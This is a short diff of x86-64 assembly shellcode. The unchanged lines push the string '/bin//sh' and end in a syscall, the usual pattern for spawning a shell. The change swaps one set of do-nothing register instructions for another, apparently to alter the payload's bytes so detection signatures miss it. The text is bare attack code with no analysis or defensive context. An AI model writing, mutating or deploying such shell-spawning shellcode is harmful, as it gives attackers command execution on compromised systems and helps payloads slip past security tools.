@@ -11,10 +11,8 @@ mov  rdi , 0x68732f2f6e69622f
 push  rdi
 push  rsp
 pop  rsi
-xchg r8, rdx
-push r8
-pop rdx
-xchg r8, rdx
-push r8
-pop rdx
+xor r8, r8
+add r8, rdx
+xor r8, r8
+add r8, rdx
 syscall
